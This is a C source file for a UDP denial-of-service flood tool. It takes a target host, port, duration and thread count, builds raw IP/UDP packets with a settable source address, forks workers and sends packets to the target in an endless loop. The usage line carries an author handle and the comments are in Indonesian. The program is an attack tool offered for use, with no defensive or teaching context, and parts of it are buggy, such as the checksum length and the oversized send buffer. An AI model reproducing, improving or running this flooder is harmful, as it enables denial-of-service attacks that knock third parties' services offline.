#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <pcap.h>

#define MAX_PACKET_SIZE 65535

unsigned short csum(unsigned short *buf, int nbytes) {
    unsigned long sum;
    for (sum = 0; nbytes > 1; nbytes -= 2)
        sum += *buf++;
    if (nbytes == 1)
        sum += *(unsigned char *)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("@h2rapids | example : %s <host> <port> <time> <thread>\n", argv[0]);
        return 1;
    }

    char *host = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    int thread = atoi(argv[4]);

    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sockfd < 0) {
        perror("socket");
        return 1;
    }

    int one = 1;
    const int *val = &one;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
        perror("setsockopt");
        return 1;
    }

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    if (inet_pton(AF_INET, host, &addr.sin_addr) <= 0) {
        perror("inet_pton");
        return 1;
    }

    char packet[MAX_PACKET_SIZE];
    memset(packet, 0, sizeof(packet));

    struct ip *ip = (struct ip *)packet;
    ip->ip_v = 4;
    ip->ip_hl = 5;
    ip->ip_tos = 0;
    ip->ip_len = htons(sizeof(struct ip) + sizeof(struct udphdr) + 1024);
    ip->ip_id = htons(getpid());
    ip->ip_off = 0;
    ip->ip_ttl = 255;
    ip->ip_p = IPPROTO_UDP;
    ip->ip_sum = 0;
    ip->ip_src.s_addr = inet_addr("192.168.1.1"); // Ganti dengan alamat IP Anda
    ip->ip_dst.s_addr = addr.sin_addr.s_addr;

    struct udphdr *udp = (struct udphdr *)(packet + sizeof(struct ip));
    udp->uh_sport = htons(12345); // Ganti dengan port sumber acak
    udp->uh_dport = htons(port);
    udp->uh_len = htons(sizeof(struct udphdr) + 1024);
    udp->uh_sum = 0;

    char *data = packet + sizeof(struct ip) + sizeof(struct udphdr);
    memset(data, 'A', 1024);

    ip->ip_sum = csum((unsigned short *)ip, ip->ip_len >> 1);

    for (int i = 0; i < thread; i++) {
        pid_t pid = fork();
        if (pid == 0) {
            while (1) {
                sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&addr, sizeof(addr));
            }
        }
    }

    sleep(time);

    return 0;
}
